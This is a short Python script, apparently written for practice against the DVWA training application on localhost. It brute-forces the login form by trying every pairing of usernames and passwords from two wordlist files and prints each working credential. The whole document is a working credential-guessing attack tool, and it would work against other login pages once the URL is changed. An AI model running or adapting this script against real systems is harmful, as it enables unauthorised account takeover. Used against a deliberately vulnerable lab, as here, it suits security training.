import requests
from itertools import product

pass_file = 'claves.txt'
user_file = 'usuarios.txt'
url = "http://127.0.0.1:4280/vulnerabilities/brute/?username={}&password={}&Login=Login"

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0',
    'Cookie': 'PHPSESSID=02c952387c05414dcd4a243e8f828e93; security=low'
}

valid_users = []
with open(pass_file, 'r') as pf, open(user_file, 'r') as uf:
    passwords = pf.read().splitlines()
    users = uf.read().splitlines()
    print("<------ Encontrando credenciales válidas ------>")
    for usuario in users:
        for password in passwords:
            login_url = url.format(usuario, password)
            try:
                response = requests.post(login_url, headers=headers)
                if "Welcome to the password protected area" in response.text:
                    print(f"Credenciales válidas encontradas: {usuario}:{password}")
                    valid_users.append((usuario, password))
            except requests.exceptions.RequestException as e:
                print(f"Error en la solicitud para {usuario}:{password} - {e}")